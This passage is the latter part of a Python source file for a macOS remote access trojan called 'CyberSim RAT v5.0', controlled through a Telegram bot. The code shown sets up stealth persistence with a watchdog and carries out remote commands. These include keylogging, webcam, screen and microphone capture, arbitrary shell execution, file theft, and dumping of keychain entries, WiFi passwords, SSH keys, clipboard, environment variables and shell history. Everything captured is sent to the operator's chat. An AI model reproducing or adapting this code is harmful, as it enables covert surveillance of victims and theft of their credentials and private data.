        print(f"\n{C.Y}[{i}/3] {desc}...{C.RS}")
        fn()

    print(f"\n{C.Y}[3/3] Starting daemon...{C.RS}")
    start_daemon_background()
    time.sleep(3)
    start_watchdog()
    print(f"{C.G}SETUP COMPLETE!{C.RS} Persistence active, watchdog on, running in background.\n"
          f"  Logs: {LOG_FILE}\n{C.Y}Status: --status | Remove: --uninstall{C.RS}")


def uninstall_stealth():
    print(f"\n{C.Y}Uninstalling CyberSim RAT v5.0 (macOS)...{C.RS}")
    results = uninstall_persistence()
    for r in results:
        print(f"  [OK] {r}", C.G)
    print(f"\n{C.G}Done! Backup: {BACKUP_DIR} | Logs: {WORKSPACE}{C.RS}\n")


# ============================================================
# TELEGRAM C2 - MAIN CLASS
# ============================================================
class TelegramC2:
    def __init__(self):
        self.last_update_id = 0
        self.running = True
        self.keylogger = KeyloggerManager()
        self.mic = MicRecorder()
        self.notif_reader = NotificationReader()
        self.notif_live_running = False
        self.browse_path = os.path.expanduser("~")

    def start(self):
        if not ensure_requests():
            log("ERROR: requests library not available!", C.R)
            sys.exit(1)
        if BOT_TOKEN == '__BOT_TOKEN__' or ADMIN_CHAT_ID <= 0:
            log("ERROR: Bot Token not set!", C.R)
            sys.exit(1)
        log(f"C2 v5.0 Started! Admin: {ADMIN_CHAT_ID}")
        self.keylogger.start()
        host = os.environ.get('HOSTNAME', subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip())
        user = os.environ.get('USER', 'unknown')
        msg = (
            f"CyberSim RAT v5.0 ONLINE\n"
            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Host: {host}\nUser: {user}\nOS: macOS\n"
            f"Root: {'YES' if is_admin() else 'NO'}\n"
            f"PID: {os.getpid()}\n"
            f"Mode: {'STEALTH' if '--daemon' in sys.argv else 'NORMAL'}\n"
            f"Keylogger: {self.keylogger.get_status_text()}\n"
            f"Watchdog: {'Active' if os.path.exists(WATCHDOG_PID_FILE) else 'Off'}\n/help"
        )
        time.sleep(1)
        try:
            tg_send_text(ADMIN_CHAT_ID, msg)
        except Exception:
            pass
        try:
            self.poll_loop()
        except KeyboardInterrupt:
            self.running = False
        finally:
            send_shutdown_notification("C2 loop ended")

    def poll_loop(self):
        while self.running:
            try:
                for u in tg_get_updates(offset=self.last_update_id + 1, timeout=10):
                    self.last_update_id = u["update_id"]
                    self.process_update(u)
            except Exception as e:
                log(f"Poll err: {e}", C.R)
            time.sleep(POLL_INTERVAL)

    def process_update(self, update):
        msg = update.get("message", {})
        chat_id = str(msg.get("chat", {}).get("id", ""))
        text = msg.get("text", "")
        doc = msg.get("document", {})
        # Handle file uploads
        if doc and chat_id == str(ADMIN_CHAT_ID):
            self._handle_upload(chat_id, doc)
            return
        if str(chat_id) != str(ADMIN_CHAT_ID) or not text:
            return
        text = text.strip()
        if not text.startswith("/"):
            return
        parts = text.split(maxsplit=1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""
        log(f"CMD: {cmd} {args}", C.CY)
        cmds = {
            "/help": self.cmd_help,
            "/start": self.cmd_help,
            "/sysinfo": self.cmd_sysinfo,
            "/screenshot": self.cmd_screenshot,
            "/webcam": self.cmd_webcam,
            "/video": lambda: self.cmd_video(args),
            "/live": lambda: self.cmd_live(args),
            "/mic": lambda: self.cmd_mic(args),
            "/browse": lambda: self.cmd_browse(args),
            "/download": lambda: self.cmd_download(args),
            "/upload": lambda: self.cmd_upload(args),
            "/keylog": lambda: self.cmd_keylog(args),
            "/shell": lambda: self.cmd_shell(args),
            "/passwords": self.cmd_passwords,
            "/wifi": self.cmd_wifi,
            "/clipboard": self.cmd_clipboard,
            "/env": self.cmd_env,
            "/pid": self.cmd_processes,
            "/network": self.cmd_network,
            "/ports": self.cmd_ports,
            "/history": self.cmd_history,
            "/locate": lambda: self.cmd_locate(args),
            "/status": self.cmd_status,
            "/apps": self.cmd_apps,
            "/battery": self.cmd_battery,
            "/whoami": self.cmd_whoami,
            "/notifications": self.cmd_notifications,
            "/notiflive": lambda: self.cmd_notiflive(args),
            "/startup_info": self.cmd_startup_info,
            "/persistence": self.cmd_persistence,
            "/remove": self.cmd_remove,
        }
        h = cmds.get(cmd)
        if h:
            h()
        else:
            tg_send_text(ADMIN_CHAT_ID, f"Unknown: {cmd}\n/help")

    def _handle_upload(self, chat_id, document):
        try:
            fid = document.get("file_id")
            fn = document.get("file_name", "uploaded")
            r = req_lib.get(f"{API}/getFile", params={"file_id": fid}, timeout=15)
            res = r.json()
            if res.get("ok"):
                fp = res["result"]["file_path"]
                r2 = req_lib.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{fp}", timeout=120)
                sp = os.path.join(WORKSPACE, fn)
                with open(sp, 'wb') as f:
                    f.write(r2.content)
                tg_send_text(chat_id, f"Uploaded: {fn} ({len(r2.content)}B) -> {sp}")
            else:
                tg_send_text(chat_id, f"getFile failed: {res}")
        except Exception as e:
            tg_send_text(chat_id, f"Upload err: {e}")

    # ========================================================
    # COMMAND HANDLERS (30+)
    # ========================================================
    def cmd_help(self):
        tg_send_text(ADMIN_CHAT_ID,
            "SYSTEM: /sysinfo /status /pid /network /ports /env /passwords /apps /battery /whoami\n"
            "CAPTURE: /screenshot /webcam /video [sec] /live [sec]\n"
            "AUDIO: /mic on|off|status\n"
            "FILES: /browse [path] /download <path> /upload\n"
            "INPUT: /keylog [on|off|clear|status|dump]\n"
            "SHELL: /shell <cmd>\n"
            "EXTRA: /wifi /clipboard /history /locate <name> /notifications\n"
            "SECURITY: /persistence /startup_info /remove"
        )

    def cmd_startup_info(self):
        tg_send_text(ADMIN_CHAT_ID,
            f"STARTUP/SHUTDOWN\nStart: RAT ONLINE sent\n"
            f"Stop: RAT OFFLINE sent (SIGTERM/SIGINT/atexit)\n"
            f"Kill: Watchdog restarts in 30s\nPID: {os.getpid()}"
        )

    def cmd_sysinfo(self):
        try:
            sw_vers = run_cmd(["sw_vers"]).strip()
            uptime = run_cmd(["uptime"]).strip()
            disk = run_cmd(["df", "-h", "/"]).strip()
            mem = run_cmd(["vm_stat"]).strip()
            ip_out = ""
            try:
                ip_out = run_cmd(["curl", "-s", "--max-time", "5", "ifconfig.me"]).strip()
            except Exception:
                pass
            arch = subprocess.run(["uname", "-m"], capture_output=True, text=True).stdout.strip()
            kernel = subprocess.run(["uname", "-r"], capture_output=True, text=True).stdout.strip()
            tg_send_text(ADMIN_CHAT_ID,
                f"Host: {os.environ.get('HOSTNAME', '')}\n"
                f"OS: macOS\n{sw_vers}\n"
                f"Kernel: {kernel}\nArch: {arch}\n"
                f"User: {os.environ.get('USER', '')}\n"
                f"Root: {'YES' if is_admin() else 'NO'}\n"
                f"PID: {os.getpid()}\nPython: {sys.executable}\n"
                f"Uptime: {uptime}\n\n"
                f"Disk:\n{disk}\n\n"
                f"Memory:\n{mem[:500]}\n\n"
                f"{'External IP: ' + ip_out if ip_out else ''}"
            )
        except Exception as e:
            tg_send_text(ADMIN_CHAT_ID, f"Sysinfo error: {e}")

    def cmd_screenshot(self):
        tg_send_text(ADMIN_CHAT_ID, "Taking screenshot...")
        path = take_screenshot()
        if path:
            tg_send_photo(ADMIN_CHAT_ID, path, f"Screenshot ({os.path.getsize(path)}B)")
            _safe_remove(path)
        else:
            tg_send_text(ADMIN_CHAT_ID, "Screenshot failed!")

    def cmd_webcam(self):
        tg_send_text(ADMIN_CHAT_ID, "Capturing webcam...")
        path = take_webcam()
        if path:
            tg_send_photo(ADMIN_CHAT_ID, path, f"Webcam ({os.path.getsize(path)}B)")
            _safe_remove(path)
        else:
            tg_send_text(ADMIN_CHAT_ID, "Webcam capture failed! Need imagesnap or ffmpeg.")

    def cmd_video(self, args=""):
        dur = 5
        try:
            dur = min(max(int(args.strip()), 1), 30) if args.strip() else 5
        except ValueError:
            pass
        tg_send_text(ADMIN_CHAT_ID, f"Recording {dur}s...")
        path = record_video(dur)
        if path:
            sz = os.path.getsize(path)
            tg_send_video(ADMIN_CHAT_ID, path, f"Video ({sz / (1024 * 1024):.1f}MB)")
            _safe_remove(path)
        else:
            tg_send_text(ADMIN_CHAT_ID, "Failed! Need ffmpeg with avfoundation")

    def cmd_live(self, args=""):
        iv = 3
        try:
            iv = int(args.strip()) if args.strip() else 3
        except ValueError:
            pass
        tg_send_text(ADMIN_CHAT_ID, f"Live: 5 shots every {iv}s")
        for i in range(5):
            path = take_screenshot()
            if path:
                tg_send_photo(ADMIN_CHAT_ID, path, f"[{i + 1}/5]")
                _safe_remove(path)
            else:
                tg_send_text(ADMIN_CHAT_ID, f"SS {i + 1} failed")
            if i < 4:
                time.sleep(iv)
        tg_send_text(ADMIN_CHAT_ID, "Live done!")

    def cmd_mic(self, args=""):
        a = args.strip().lower()
        if a == "on":
            tg_send_text(ADMIN_CHAT_ID, f"Mic: {self.mic.start(ADMIN_CHAT_ID)}")
        elif a == "off":
            tg_send_text(ADMIN_CHAT_ID, f"Mic: {self.mic.stop()}")
        elif a == "status":
            tg_send_text(ADMIN_CHAT_ID, f"Mic: {'ON' if self.mic.recording else 'Off'} ({self.mic.chunk_count})")
        else:
            tg_send_text(ADMIN_CHAT_ID, "/mic on|off|status")

    def cmd_browse(self, args=""):
        args = args.strip()
        sh = False
        if not args:
            path = self.browse_path
        elif args.lower() == "hidden":
            path = self.browse_path
            sh = True
        elif args == "..":
            path = os.path.dirname(self.browse_path) or "/"
        else:
            path = args
        try:
            if not os.path.isabs(path):
                path = os.path.join(self.browse_path, path)
            path = os.path.abspath(path)
            if not os.path.exists(path):
                tg_send_text(ADMIN_CHAT_ID, f"Not found: {path}")
                return
            if os.path.isfile(path):
                sz = os.path.getsize(path)
                s = f"{sz / (1024 * 1024):.1f}MB" if sz > 1048576 else f"{sz / 1024:.1f}KB" if sz > 1024 else f"{sz}B"
                tg_send_text(ADMIN_CHAT_ID, f"FILE: {path}\nSize: {s}")
                return
            if not os.path.isdir(path):
                tg_send_text(ADMIN_CHAT_ID, f"Not a directory: {path}")
                return
            self.browse_path = path
            entries = os.listdir(path)
            if not sh:
                entries = [e for e in entries if not e.startswith('.')]
            dirs = sorted([e for e in entries if os.path.isdir(os.path.join(path, e))])
            files = sorted([e for e in entries if os.path.isfile(os.path.join(path, e))])
            msg = f"DIR: {path}\n"
            if dirs:
                msg += f"\nDIRS ({len(dirs)}):\n"
                for d in dirs[:50]:
                    dp = os.path.join(path, d)
                    try:
                        cnt = len(os.listdir(dp))
                        msg += f"  {d}/ ({cnt} items)\n"
                    except Exception:
                        msg += f"  {d}/\n"
            if files:
                msg += f"\nFILES ({len(files)}):\n"
                for f in files[:50]:
                    fp = os.path.join(path, f)
                    sz = os.path.getsize(fp)
                    s = f"{sz / (1024 * 1024):.1f}MB" if sz > 1048576 else f"{sz / 1024:.1f}KB" if sz > 1024 else f"{sz}B"
                    msg += f"  {f} ({s})\n"
            total = len(dirs) + len(files)
            msg += f"\nTotal: {total} items"
            if total > 100:
                msg += " (showing first 50 each)"
            tg_send_text(ADMIN_CHAT_ID, msg[:4000])
        except Exception as e:
            tg_send_text(ADMIN_CHAT_ID, f"Browse error: {e}")

    def cmd_download(self, args=""):
        fpath = args.strip()
        if not fpath:
            tg_send_text(ADMIN_CHAT_ID, "Usage: /download <path>")
            return
        if not os.path.isabs(fpath):
            fpath = os.path.abspath(fpath)
        if not os.path.exists(fpath):
            tg_send_text(ADMIN_CHAT_ID, f"Not found: {fpath}")
            return
        if os.path.isdir(fpath):
            # Zip the folder
            zip_path = os.path.join(WORKSPACE, f"download_{int(time.time())}.zip")
            try:
                subprocess.run(["zip", "-r", "-q", zip_path, fpath], timeout=120, capture_output=True)
                if os.path.exists(zip_path):
                    sz = os.path.getsize(zip_path)
                    if sz > 50 * 1024 * 1024:
                        tg_send_text(ADMIN_CHAT_ID, f"Folder too large ({sz / (1024 * 1024):.1f}MB). Max 50MB.")
                        _safe_remove(zip_path)
                        return
                    send_file(zip_path, f"Folder: {os.path.basename(fpath)} ({sz / (1024 * 1024):.1f}MB)")
                    _safe_remove(zip_path)
                else:
                    tg_send_text(ADMIN_CHAT_ID, "Zip failed!")
            except Exception as e:
                tg_send_text(ADMIN_CHAT_ID, f"Zip error: {e}")
        else:
            sz = os.path.getsize(fpath)
            if sz > 50 * 1024 * 1024:
                tg_send_text(ADMIN_CHAT_ID, f"File too large ({sz / (1024 * 1024):.1f}MB). Max 50MB.")
                return
            send_file(fpath, f"File: {os.path.basename(fpath)} ({sz / (1024 * 1024):.1f}MB)")

    def cmd_upload(self, args):
        tg_send_text(ADMIN_CHAT_ID, "Send a file as a document to upload it.\nMax 50MB.\nFiles saved to: " + WORKSPACE)

    def cmd_keylog(self, args=""):
        a = args.strip().lower()
        if a in ("on", "start"):
            if not self.keylogger.running:
                self.keylogger.start()
            tg_send_text(ADMIN_CHAT_ID, f"Keylogger: {self.keylogger.get_status_text()}")
        elif a in ("off", "stop"):
            if self.keylistener and self.keylogger.running:
                try:
                    self.keylogger.listener.stop()
                except Exception:
                    pass
                self.keylogger.running = False
            tg_send_text(ADMIN_CHAT_ID, "Keylogger stopped")
        elif a == "clear":
            result = self.keylogger.clear()
            tg_send_text(ADMIN_CHAT_ID, f"Keylog cleared: {'OK' if result else 'Failed'}")
        elif a == "status":
            tg_send_text(ADMIN_CHAT_ID,
                f"Keylogger: {self.keylogger.get_status_text()}\n"
                f"Keystrokes: {self.keylogger.keystroke_count}\n"
                f"Log file: {KEYLOG_FILE}\n"
                f"Size: {os.path.getsize(KEYLOG_FILE) if os.path.exists(KEYLOG_FILE) else 0}B"
            )
        elif a == "dump":
            data = self.keylogger.dump()
            if data.strip():
                # Send as file if too large
                if len(data) > 4000:
                    _save_to_file(os.path.join(WORKSPACE, "keylog_dump.txt"), data)
                    send_file(os.path.join(WORKSPACE, "keylog_dump.txt"), f"Keylog dump ({len(data)} chars)")
                else:
                    tg_send_text(ADMIN_CHAT_ID, f"Keylog ({len(data)} chars):\n{data}")
            else:
                tg_send_text(ADMIN_CHAT_ID, "No keylog data yet")
        else:
            tg_send_text(ADMIN_CHAT_ID, "/keylog on|off|clear|status|dump")

    def cmd_shell(self, cmd):
        cmd = cmd.strip()
        if not cmd:
            tg_send_text(ADMIN_CHAT_ID, "Usage: /shell <command>")
            return
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            output = (result.stdout + result.stderr).strip()
            if not output:
                output = "(no output)"
            if len(output) > 4000:
                fname = os.path.join(WORKSPACE, f"shell_{int(time.time())}.txt")
                _save_to_file(fname, output)
                send_file(fname, f"Shell output ({len(output)} chars)")
            else:
                tg_send_text(ADMIN_CHAT_ID, f"$ {cmd}\n{output}")
        except subprocess.TimeoutExpired:
            tg_send_text(ADMIN_CHAT_ID, "Command timed out (60s)")
        except Exception as e:
            tg_send_text(ADMIN_CHAT_ID, f"Shell error: {e}")

    def cmd_passwords(self):
        results = []
        # SSH keys
        ssh_dir = os.path.expanduser("~/.ssh")
        if os.path.isdir(ssh_dir):
            ssh_files = []
            for f in os.listdir(ssh_dir):
                fp = os.path.join(ssh_dir, f)
                if os.path.isfile(fp) and not f.endswith('.pub') and not f.endswith('.known_hosts'):
                    sz = os.path.getsize(fp)
                    ssh_files.append(f"  {f} ({sz}B)")
            if ssh_files:
                results.append(f"SSH Keys ({len(ssh_files)}):")
                results.extend(ssh_files)
            else:
                results.append("SSH Keys: None found")
        else:
            results.append("SSH Keys: ~/.ssh not found")
        # WiFi passwords
        results.append(f"\n{get_wifi_passwords()}")
        # Keychain generic passwords (limited info)
        try:
            keychain_out = subprocess.run(
                ["security", "dump-keychain"],
                capture_output=True, text=True, timeout=15
            ).stdout
            # Extract just generic/internet password entries (not actual passwords)
            entries = []
            for line in keychain_out.split('\n'):
                if 'svce' in line.lower() or 'agrp' in line.lower() or 'acct' in line.lower():
                    entries.append(line.strip())
            if entries:
                results.append(f"\nKeychain entries (partial, {len(entries)} refs):")
                results.extend(entries[:30])
        except Exception:
            results.append("\nKeychain: Access denied or error")
        tg_send_text(ADMIN_CHAT_ID, "\n".join(results)[:4000])

    def cmd_wifi(self):
        tg_send_text(ADMIN_CHAT_ID, f"WiFi Networks:\n{get_wifi_networks()}")

    def cmd_clipboard(self):
        cb = get_clipboard()
        if cb.strip():
            if len(cb) > 4000:
                fname = os.path.join(WORKSPACE, f"clipboard_{int(time.time())}.txt")
                _save_to_file(fname, cb)
                send_file(fname, f"Clipboard ({len(cb)} chars)")
            else:
                tg_send_text(ADMIN_CHAT_ID, f"Clipboard:\n{cb}")
        else:
            tg_send_text(ADMIN_CHAT_ID, "Clipboard is empty")

    def cmd_env(self):
        env_items = []
        for k, v in sorted(os.environ.items()):
            env_items.append(f"{k}={v}")
        env_text = "\n".join(env_items)
        if len(env_text) > 4000:
            fname = os.path.join(WORKSPACE, f"env_{int(time.time())}.txt")
            _save_to_file(fname, env_text)
            send_file(fname, f"Environment variables ({len(env_items)} vars)")
        else:
            tg_send_text(ADMIN_CHAT_ID, f"Environment ({len(env_items)} vars):\n{env_text}")

    def cmd_processes(self):
        try:
            result = run_cmd(["ps", "aux"])
            lines = result.strip().split('\n')
            if len(lines) > 100:
                header = lines[0]
                body = '\n'.join(lines[1:100])
                tg_send_text(ADMIN_CHAT_ID, f"Processes (top 100 of {len(lines) - 1}):\n{header}\n{body}")
                fname = os.path.join(WORKSPACE, f"ps_{int(time.time())}.txt")
                _save_to_file(fname, result)
                send_file(fname, f"All processes ({len(lines) - 1} total)")
            else:
                tg_send_text(ADMIN_CHAT_ID, f"Processes:\n{result}")
        except Exception as e:
            tg_send_text(ADMIN_CHAT_ID, f"Process list error: {e}")

    def cmd_network(self):
        try:
            ifconfig_out = run_cmd(["ifconfig"]).strip()
            ip_pub = ""
            try:
                ip_pub = run_cmd(["curl", "-s", "--max-time", "5", "ifconfig.me"]).strip()
            except Exception:
                pass
            msg = f"Network Interfaces:\n{ifconfig_out[:2500]}"
            if ip_pub:
                msg += f"\n\nPublic IP: {ip_pub}"
            # Also show routing table summary
            try:
                routes = run_cmd(["netstat", "-rn"]).strip()
                msg += f"\n\nRouting Table (default routes):\n"
                for line in routes.split('\n'):
                    if 'default' in line:
                        msg += line + "\n"
            except Exception:
                pass
            if len(msg) > 4000:
                fname = os.path.join(WORKSPACE, f"network_{int(time.time())}.txt")
                _save_to_file(fname, msg)
                send_file(fname, "Network info")
            else:
                tg_send_text(ADMIN_CHAT_ID, msg)
        except Exception as e:
            tg_send_text(ADMIN_CHAT_ID, f"Network error: {e}")

    def cmd_ports(self):
        try:
            result = run_cmd(["lsof", "-i", "-P", "-n", "-sTCP:LISTEN"]).strip()
            if result.strip():
                lines = result.split('\n')
                if len(lines) > 50:
                    header = lines[0]
                    body = '\n'.join(lines[1:50])
                    tg_send_text(ADMIN_CHAT_ID, f"Open Ports (top 50 of {len(lines) - 1}):\n{header}\n{body}")
                else:
                    tg_send_text(ADMIN_CHAT_ID, f"Open Ports:\n{result}")
            else:
                tg_send_text(ADMIN_CHAT_ID, "No open listening ports found")
        except Exception as e:
            # lsof may need root, try netstat fallback
            try:
                result = run_cmd(["netstat", "-an"]).strip()
                listening = [l for l in result.split('\n') if 'LISTEN' in l]
                if listening:
                    tg_send_text(ADMIN_CHAT_ID, f"Listening ports (netstat):\n" + '\n'.join(listening[:50]))
                else:
                    tg_send_text(ADMIN_CHAT_ID, "No listening ports found")
            except Exception:
                tg_send_text(ADMIN_CHAT_ID, f"Ports error: {e}")

    def cmd_history(self):
        results = []
        # Try zsh history
        zsh_hist = os.path.expanduser("~/.zsh_history")
        bash_hist = os.path.expanduser("~/.bash_history")
        for hist_path, shell_name in [(zsh_hist, "zsh"), (bash_hist, "bash")]:
            if os.path.exists(hist_path):
                try:
                    with open(hist_path, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                    results.append(f"{shell_name} history ({len(lines)} lines):")
                    # Get last 50 meaningful commands
                    cmds = []
                    for line in lines:
                        line = line.strip()
                        if line and not line.startswith('#') and len(line) > 3:
                            cmds.append(line)
                    for cmd in cmds[-50:]:
                        results.append(f"  {cmd[:200]}")
                except Exception as e:
                    results.append(f"{shell_name}: read error: {e}")
            else:
                results.append(f"{shell_name}: {hist_path} not found")
        text = '\n'.join(results)
        if len(text) > 4000:
            fname = os.path.join(WORKSPACE, f"history_{int(time.time())}.txt")
            _save_to_file(fname, text)
            send_file(fname, "Shell history")
        else:
            tg_send_text(ADMIN_CHAT_ID, text if text.strip() else "No history found")

    def cmd_locate(self, name=""):
        name = name.strip()
        if not name:
            tg_send_text(ADMIN_CHAT_ID, "Usage: /locate <filename>")
            return
        try:
            result = run_cmd(["mdfind", "-name", name]).strip()
            lines = result.split('\n')
            found = [l for l in lines if l.strip() and os.path.exists(l)]
            if found:
                msg = f"Found {len(found)} results for '{name}':\n"
                msg += '\n'.join(found[:50])
                if len(found) > 50:
                    msg += f"\n... and {len(found) - 50} more"
                if len(msg) > 4000:
                    fname = os.path.join(WORKSPACE, f"locate_{int(time.time())}.txt")
                    _save_to_file(fname, '\n'.join(found))
                    send_file(fname, f"Locate results: {name} ({len(found)} found)")
                else:
                    tg_send_text(ADMIN_CHAT_ID, msg)
            else:
                tg_send_text(ADMIN_CHAT_ID, f"Nothing found for '{name}'")
        except Exception as e:
            tg_send_text(ADMIN_CHAT_ID, f"Locate error: {e}")

    def cmd_status(self):
        pid = os.getpid()
        kl = self.keylogger.get_status_text()
        mic = 'ON' if self.mic.recording else 'Off'
        pers = show_persistence_status()
        wd = os.path.exists(WATCHDOG_PID_FILE)
        tg_send_text(ADMIN_CHAT_ID,
            f"RAT macOS v5.0 STATUS\n"
            f"{'='*30}\n"
            f"PID: {pid}\n"
            f"User: {os.environ.get('USER', '')}\n"
            f"Root: {'YES' if is_admin() else 'NO'}\n"
            f"Uptime: {run_cmd(['uptime']).strip()}\n"
            f"Keylogger: {kl}\n"
            f"Mic: {mic} ({self.mic.chunk_count})\n"
            f"Watchdog: {'Active' if wd else 'Off'}\n"
            f"{'='*30}\n"
            f"Persistence:\n{pers}"
        )

    def cmd_apps(self):
        results = []
        # Installed applications
        apps_dir = "/Applications"
        if os.path.isdir(apps_dir):
            apps = sorted(os.listdir(apps_dir))
            results.append(f"Applications ({len(apps)}):")
            for app in apps[:50]:
                results.append(f"  {app}")
            if len(apps) > 50:
                results.append(f"  ... and {len(apps) - 50} more")
        # Homebrew packages
        brew_result = subprocess.run(
            ["brew", "list", "--formula"],
            capture_output=True, text=True, timeout=15
        )
        if brew_result.returncode == 0 and brew_result.stdout.strip():
            brew_pkgs = brew_result.stdout.strip().split('\n')
            results.append(f"\nHomebrew ({len(brew_pkgs)}):")
            for pkg in brew_pkgs[:30]:
                results.append(f"  {pkg}")
            if len(brew_pkgs) > 30:
                results.append(f"  ... and {len(brew_pkgs) - 30} more")
        # Homebrew casks
        cask_result = subprocess.run(
            ["brew", "list", "--cask"],
            capture_output=True, text=True, timeout=15
        )
        if cask_result.returncode == 0 and cask_result.stdout.strip():
            casks = cask_result.stdout.strip().split('\n')
            results.append(f"\nHomebrew Casks ({len(casks)}):")
            for c in casks[:20]:
                results.append(f"  {c}")
        # User apps
        user_apps = os.path.expanduser("~/Applications")
        if os.path.isdir(user_apps):
            user_list = sorted(os.listdir(user_apps))
            if user_list:
                results.append(f"\nUser Applications ({len(user_list)}):")
                for a in user_list[:20]:
                    results.append(f"  {a}")
        text = '\n'.join(results)
        if len(text) > 4000:
            fname = os.path.join(WORKSPACE, f"apps_{int(time.time())}.txt")
            _save_to_file(fname, text)
            send_file(fname, "Installed applications")
        else:
            tg_send_text(ADMIN_CHAT_ID, text if text.strip() else "No apps found")

    def cmd_battery(self):
        try:
            batt = run_cmd(["pmset", "-g", "batt"]).strip()
            profile = run_cmd(["pmset", "-g", "custom"]).strip()
            # Get more detailed battery info
            power = run_cmd(["system_profiler", "SPPowerDataType"]).strip()
            tg_send_text(ADMIN_CHAT_ID,
                f"Battery Status:\n{batt}\n\n"
                f"Power Profile:\n{profile[:500]}\n\n"
                f"Detailed:\n{power[:2000]}"
            )
        except Exception as e:
            tg_send_text(ADMIN_CHAT_ID, f"Battery error: {e}")

    def cmd_whoami(self):
        user = os.environ.get('USER', 'unknown')
        home = os.path.expanduser('~')
        shell = os.environ.get('SHELL', 'unknown')
        uid = os.getuid()
        euid = os.geteuid()
        groups = subprocess.run(["id"], capture_output=True, text=True).stdout.strip()
        tg_send_text(ADMIN_CHAT_ID,
            f"User: {user}\nHome: {home}\nShell: {shell}\n"
            f"UID: {uid}\nEUID: {euid}\nRoot: {'YES' if uid == 0 else 'NO'}\n"
            f"Groups: {groups}"
        )

    def cmd_notifications(self):
        tg_send_text(ADMIN_CHAT_ID, self.notif_reader.get_notifications())

    def cmd_notiflive(self, args=""):
        if self.notif_live_running:
            tg_send_text(ADMIN_CHAT_ID, "NotifLive already running!")
            return
        self.notif_live_running = True
        tg_send_text(ADMIN_CHAT_ID, "Notification monitoring ON for 60s...")

        def _live():
            start = time.time()
            last_count = 0
            while self.notif_live_running and time.time() - start < 60:
                try:
                    notif = self.notif_reader.get_notifications(5)
                    current = notif.count('[')
                    if current > last_count:
                        tg_send_text(ADMIN_CHAT_ID, f"NEW NOTIFICATION!\n{notif}")
                        last_count = current
                except Exception:
                    pass
                time.sleep(10)
            self.notif_live_running = False
            tg_send_text(ADMIN_CHAT_ID, "Notification monitoring OFF")

        threading.Thread(target=_live, daemon=True).start()

    def cmd_persistence(self):
        tg_send_text(ADMIN_CHAT_ID, f"Persistence Status:\n{show_persistence_status()}")

    def cmd_remove(self):
        tg_send_text(ADMIN_CHAT_ID, "Uninstalling RAT...")
        results = uninstall_persistence()
        msg = "Uninstall complete!\n" + '\n'.join(results)
        tg_send_text(ADMIN_CHAT_ID, msg)
        time.sleep(1)
        os._exit(0)


# ============================================================
# MAIN ENTRY POINT
# ============================================================
if __name__ == "__main__":
    if "--install" in sys.argv:
        install_stealth()
        sys.exit(0)
    elif "--uninstall" in sys.argv:
        uninstall_stealth()
        sys.exit(0)
    elif "--status" in sys.argv:
        show_status()
        sys.exit(0)
    elif "--watchdog" in sys.argv:
        run_watchdog()
        sys.exit(0)
    elif "--daemon" in sys.argv:
        run_as_daemon()
        sys.exit(0)

    # Normal mode
    auto_install_deps()
    try:
        TelegramC2().start()
    except KeyboardInterrupt:
        send_shutdown_notification("User interrupted")
    except Exception as e:
        log(f"Main error: {e}", C.R)
        send_shutdown_notification(f"Fatal: {e}")
